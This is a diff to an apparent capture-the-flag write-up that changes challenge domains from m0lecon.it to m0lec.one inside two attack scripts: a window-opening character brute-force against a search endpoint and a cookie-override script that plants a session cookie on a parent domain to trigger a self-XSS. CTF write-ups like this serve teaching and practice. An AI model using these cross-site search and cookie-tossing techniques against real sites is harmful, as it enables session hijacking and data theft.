@@ -13,8 +13,8 @@ wins = []
 str = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 for (var i = 0; i < str.length; i++) {
   c = str.charAt(i)
-  console.log('https://telegrambotclient.m0lecon.it/locations?search='+name+c)
-  r = window.open('https://telegrambotclient.m0lecon.it/locations?search='+name +c)
+  console.log('https://telegrambotclient.m0lec.one/locations?search='+name+c)
+  r = window.open('https://telegrambotclient.m0lec.one/locations?search='+name +c)
   wins.push(r)
 }
 
@@ -75,10 +75,10 @@ In this way it's possible to exploit the self-xss in the note subdomain and fetc
 ## Script for cookie override
 
 ```javascript
-w = window.open('http://note.m0lecon.it:8080/note?id=1','flag')
+w = window.open('http://note.m0lec.one/note?id=1','flag')
 newcookie = 'YOUR NOTE SESSION COOKIE'
-document.cookie = 'session=' + newcookie + '; domain=.m0lecon.it; path=/note'
-document.location = 'http://note.m0lecon.it:8080/note?id=2' //self-xss
+document.cookie = 'session=' + newcookie + '; domain=.m0lec.one; path=/note'
+document.location = 'http://note.m0lec.one:8080/note?id=2' //self-xss
 ```
 
 ## Script on note subdomain
